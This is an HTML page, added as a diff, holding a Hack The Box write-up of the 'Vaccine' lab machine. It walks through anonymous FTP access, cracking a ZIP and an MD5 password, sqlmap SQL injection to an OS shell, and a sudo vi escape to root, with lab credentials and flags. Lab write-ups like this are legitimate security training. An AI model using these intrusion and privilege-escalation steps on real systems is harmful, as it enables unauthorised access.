@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vaccine — Hack The Box</title>
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="stylesheet" href="../styles.css">
+    <script src="../script.js" defer></script>
+</head>
+
+<body>
+
+<div id="mobile-menu-button">
+    &#9776;
+</div>
+
+<div id="sidebar" class="sidebar">
+    <h2>~/home</h2>
+    <a href="../index.html">Home</a>
+    <a href="../about.html">About Me</a>
+    <a href="../projects.html">Projects</a>
+    <a href="../writeups.html" class="active">Write-Ups</a>
+    <a href="../contact.html">Contact</a>
+
+    <div class="social-icons">
+        <a href="https://www.linkedin.com/in/iustin-barbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/linkedin.svg" alt="LinkedIn">
+        </a>
+        <a href="https://github.com/IustinBarbir" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/github.svg" alt="GitHub">
+        </a>
+        <a href="https://tryhackme.com/p/Glitch21" target="_blank">
+            <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/tryhackme.svg" alt="TryHackMe">
+        </a>
+    </div>
+</div>
+
+<section id="writeup-container">
+    <div class="writeup-content">
+
+        <h1>Vaccine — Hack The Box</h1>
+
+        <h2>Task 1</h2>
+        <p>Besides SSH and HTTP, what other service is hosted on this box?</p>
+
+<pre><code>21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1
+80/tcp open  http    Apache httpd 2.4.41</code></pre>
+
+        <p><strong>Answer:</strong> FTP</p>
+
+        <h2>Task 2</h2>
+        <p>This service can be configured to allow login with any password for a specific username. What is that username?</p>
+
+        <p><strong>Answer:</strong> anonymous</p>
+
+        <h2>Task 3</h2>
+        <p>What is the name of the file downloaded over this service?</p>
+
+<pre><code>ftp anonymous@10.129.64.54
+
+ftp> ls
+backup.zip
+
+ftp> get backup.zip</code></pre>
+
+        <p><strong>Answer:</strong> backup.zip</p>
+
+        <h2>Task 4</h2>
+        <p>What script from John The Ripper generates a crackable hash from a password protected ZIP archive?</p>
+
+        <p><strong>Answer:</strong> zip2john</p>
+
+        <h2>Task 5</h2>
+        <p>What is the password for the admin user on the website?</p>
+
+        <p>First, extract the ZIP hash:</p>
+
+<pre><code>zip2john backup.zip > hash.txt</code></pre>
+
+        <p>Then crack it:</p>
+
+<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+741852963 (backup.zip)</code></pre>
+
+        <p>Extract the archive using the recovered password and inspect <code>index.php</code>.</p>
+
+        <p>The login uses an MD5 hash:</p>
+
+<pre><code>if($_POST['username'] === 'admin'
+&& md5($_POST['password']) ===
+"2cb42f8734ea607eefed3b70af13bbd3")</code></pre>
+
+        <p>Using an online MD5 decoder reveals:</p>
+
+        <p><strong>Answer:</strong> qwerty789</p>
+
+        <h2>Task 6</h2>
+        <p>What option can be passed to sqlmap to try to get command execution via SQL injection?</p>
+
+        <p><strong>Answer:</strong> <code>--os-shell</code></p>
+
+        <p>After logging into the website, the vulnerable parameter is the search field.</p>
+
+        <p>A valid session cookie is required:</p>
+
+<pre><code>sqlmap -u "http://10.129.64.54/dashboard.php?search=test" \
+--cookie="PHPSESSID=..." \
+--os-shell</code></pre>
+
+        <p>This provides an OS shell as the <code>postgres</code> user.</p>
+
+        <h2>Task 7</h2>
+        <p>What program can the postgres user run as root using sudo?</p>
+
+        <p>I upgraded the shell to a fully interactive TTY using:</p>
+
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+
+        <p>The shell was unstable, so I searched for database credentials and found them inside <code>/var/www/html/dashboard.php</code>:</p>
+
+<pre><code>password=P@s5w0rd!</code></pre>
+
+        <p>I then logged in through SSH as <code>postgres</code> using the recovered password.</p>
+
+        <p>Running:</p>
+
+<pre><code>sudo -l</code></pre>
+
+        <p>revealed:</p>
+
+<pre><code>(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></pre>
+
+        <p><strong>Answer:</strong> vi</p>
+
+        <h2>User Flag</h2>
+
+<pre><code>cat ~/user.txt
+
+ec9b13ca4d6229cd5cc1e09980965bf7</code></pre>
+
+        <h2>Privilege Escalation</h2>
+
+        <p>GTFOBins provides a privilege escalation technique for running <code>vi</code> with sudo.</p>
+
+<pre><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+:set shell=/bin/sh
+:shell</code></pre>
+
+        <p>This spawns a root shell.</p>
+
+<pre><code>whoami
+
+root</code></pre>
+
+        <h2>Root Flag</h2>
+
+<pre><code>cd /root
+cat root.txt
+
+dd6e058e814260bc70e9bbdef2715849</code></pre>
+
+    </div>
+</section>
+
+</body>
+</html>
